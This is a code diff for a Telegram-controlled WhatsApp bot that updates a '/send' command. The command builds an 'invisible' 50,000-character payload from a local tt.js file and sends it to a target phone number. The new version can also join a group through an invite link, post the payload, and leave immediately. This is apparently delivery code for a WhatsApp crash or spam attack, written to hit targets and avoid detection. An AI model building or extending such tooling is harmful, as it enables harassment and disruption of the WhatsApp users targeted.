@@ -1694,20 +1694,20 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
 
     
 // ==========================================
-// NEW: /send [number] - DYNAMIC TT.JS ENGINE
+// UPDATED: /send [number OR groupLink]
 // ==========================================
-bot.onText(/\/send\s+(\d+)/, async (msg, match) => {
+bot.onText(/\/send\s+(\S+)/, async (msg, match) => {
     const chatId = msg.chat.id.toString();
     if (chatId !== ADMIN_ID) return;
 
-    const targetNumber = match[1];
-    let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Generating 50,000 char payload from tt.js...`);
+    const target = match[1]; // Can be a phone number or a link
+    let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Generating payload from tt.js...`);
 
     try {
+        // 1. Process tt.js
         const ttPath = path.join(__dirname, 'tt.js');
         if (!fs.existsSync(ttPath)) throw new Error('tt.js file not found.');
 
-        // 1. Read and execute tt.js code in a sandbox
         const code = fs.readFileSync(ttPath, 'utf8');
         const sandbox = { console: console, message: "" };
         vm.createContext(sandbox);
@@ -1716,17 +1716,43 @@ bot.onText(/\/send\s+(\d+)/, async (msg, match) => {
         const finalPayload = sandbox.message;
         if (!finalPayload) throw new Error('Captured "message" variable is empty.');
 
-        // 2. Identify the active WhatsApp socket
-        // Uses global.sock (set in index.js) or falls back to first active client
+        // 2. Get Active Socket
         const activeSock = global.sock || Object.values(clients)[0];
         if (!activeSock) throw new Error('No active WhatsApp connection (sock) found.');
 
-        const waId = targetNumber.includes('@c.us') ? targetNumber : `${targetNumber}@c.us`;
-        
-        // 3. Dispatch the message
-        await activeSock.sendMessage(waId, { text: finalPayload });
+        // 3. Check if target is a Group Link
+        if (target.includes('chat.whatsapp.com/')) {
+            const groupCode = target.split('chat.whatsapp.com/')[1].split(/[?#]/)[0];
+            
+            await bot.editMessageText(`[GROUP MODE] Joining group ${groupCode}...`, {
+                chat_id: chatId,
+                message_id: statusMsg.message_id
+            });
 
-        await bot.editMessageText(`[SUCCESS] ✅ Invisible payload sent to ${targetNumber}!`, {
+            // Join the group
+            const groupJid = await activeSock.groupAcceptInvite(groupCode);
+            await delay(2000); // Wait for metadata sync
+
+            // Send payload
+            await activeSock.sendMessage(groupJid, { text: finalPayload });
+            await bot.editMessageText(`[SUCCESS] Payload sent to group. Leaving now...`, {
+                chat_id: chatId,
+                message_id: statusMsg.message_id
+            });
+
+            // Leave the group immediately
+            await delay(1000);
+            await activeSock.groupLeave(groupJid);
+
+        } else {
+            // 4. Standard Number Mode
+            const cleanNum = target.replace(/\D/g, '');
+            const waId = cleanNum.includes('@c.us') ? cleanNum : `${cleanNum}@c.us`;
+
+            await activeSock.sendMessage(waId, { text: finalPayload });
+        }
+
+        await bot.editMessageText(`[SUCCESS] ✅ Payload delivered to ${target}!`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
